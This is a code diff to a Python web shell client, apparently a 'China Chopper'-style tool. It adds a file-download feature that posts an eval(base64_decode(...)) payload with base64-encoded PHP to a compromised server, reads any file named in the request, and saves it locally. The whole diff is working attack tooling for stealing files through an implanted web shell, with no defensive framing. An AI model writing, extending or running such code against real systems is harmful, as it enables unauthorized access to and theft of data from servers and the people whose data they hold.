@@ -1,5 +1,5 @@
 #! /usr/bin/python
-# coding:utf-8
+# encoding: utf-8
 
 import sys, getopt
 import re
@@ -201,13 +201,42 @@ class PullConnector(FileConnector):
     # return: none
     def __init__(self, url, password, server, fileList):
         FileConnector.__init__(self, url, password, server, fileList)
+        self.remoteFilePath = self.fileList[0]
+        self.localFilePath = self.fileList[1]
+
+    # Get a file download payload
+    # param: server, password
+    # return: payload
+    def getPayload(self, server, password, remoteFilePath):
+        if server == 'php':
+            payload = {}
+            payload['c1'] = remoteFilePath
+            payload['c0'] = 'ZWNobyBmcmVhZChmb3BlbigkX1JFUVVFU1RbJ2MxJ10sJ3InKSxmaWxlc2l6ZSgkX1JFUVVFU1RbJ2MxJ10pKTs='
+            payload[password] = '@eval(base64_decode($_REQUEST["c0"]));'
+            return payload
+        elif server == 'asp':
+            pass
+        elif server == 'aspx':
+            pass
+        elif server == 'jsp':
+            pass
+    
+    # Download file
+    # param: none
+    # return: none
+    def downloadFile(self):
+        payload = self.getPayload(self.server, self.password, self.remoteFilePath)
+        status, result = Connector.postToServer(self, payload)
+        f = file(self.localFilePath, 'w')
+        f.write(result)
+        f.close()
 
     # The callable method to launch the connector
     # param: none
     # return: none
     def launch(self):
         if FileConnector.launch(self) != 'fail':
-            print 'Pull launched!', self.fileList
+            self.downloadFile()
 
 
 
